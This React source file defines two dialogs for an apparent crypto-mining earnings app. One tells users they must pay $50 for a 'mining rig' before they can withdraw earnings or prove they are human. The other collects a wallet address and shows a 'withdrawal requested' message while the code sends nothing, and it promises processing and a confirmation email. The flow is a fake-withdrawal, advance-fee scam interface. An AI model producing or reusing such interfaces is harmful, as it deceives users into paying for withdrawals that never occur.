import { useState } from "react";
import { toast } from "sonner";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";

interface VerifyDialogProps {
  open: boolean;
  onOpenChange: (o: boolean) => void;
  onBuy: () => void;
}

export function VerifyDialog({ open, onOpenChange, onBuy }: VerifyDialogProps) {
  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent>
        <DialogHeader>
          <DialogTitle>🔒 Verify to withdraw</DialogTitle>
          <DialogDescription>
            To withdraw your earnings and confirm you're human, a one-time mining rig
            purchase ($50) is required.
          </DialogDescription>
        </DialogHeader>
        <div className="rounded-xl bg-surface-2 p-3 text-xs leading-relaxed text-muted-foreground">
          🛡️ Protects the network from bots.
          <br />⚡ Withdrawals unlock immediately after payment.
        </div>
        <DialogFooter className="gap-2 sm:gap-2">
          <Button variant="secondary" onClick={() => onOpenChange(false)}>
            Later
          </Button>
          <Button onClick={onBuy}>Buy miner →</Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}

interface WithdrawDialogProps {
  open: boolean;
  onOpenChange: (o: boolean) => void;
  sym: string | null;
  amount: string;
  usd: string;
}

export function WithdrawDialog({ open, onOpenChange, sym, amount, usd }: WithdrawDialogProps) {
  const [addr, setAddr] = useState("");

  const confirm = () => {
    if (!addr.trim()) return toast.error("Enter a wallet address");
    onOpenChange(false);
    setAddr("");
    toast.success(`Withdrawal of ${amount} ${sym} requested ✓`);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent>
        <DialogHeader>
          <DialogTitle>💸 Withdraw {sym}</DialogTitle>
          <DialogDescription>
            Send {amount} {sym} ({usd}) to your wallet.
          </DialogDescription>
        </DialogHeader>
        <input
          autoFocus
          placeholder={`Your ${sym} wallet address`}
          value={addr}
          onChange={(e) => setAddr(e.target.value)}
          className="text-mono w-full rounded-lg border border-border bg-surface-2 px-3 py-2.5 text-xs outline-none focus:border-mint"
        />
        <div className="rounded-xl bg-surface-2 p-3 text-[11.5px] leading-relaxed text-muted-foreground">
          ⏳ Processed within 24–48 hours.
          <br />📧 Confirmation email sent on completion.
          <br />💳 Minimum $10 per withdrawal.
        </div>
        <DialogFooter className="gap-2 sm:gap-2">
          <Button variant="secondary" onClick={() => onOpenChange(false)}>
            Cancel
          </Button>
          <Button onClick={confirm}>Confirm withdrawal</Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}
